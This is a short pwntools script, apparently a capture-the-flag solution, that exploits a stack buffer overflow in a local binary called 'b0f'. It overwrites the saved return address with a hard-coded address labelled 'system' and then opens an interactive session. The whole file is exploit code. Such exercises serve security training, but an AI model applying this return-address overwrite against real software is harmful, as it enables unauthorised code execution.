from pwn import *
r = process("b0f")
system = 0x4005DB
payload = 'A'*0x20
payload += 'B'*8 # rbp
payload += p64(system)

r.sendline(payload)
r.interactive()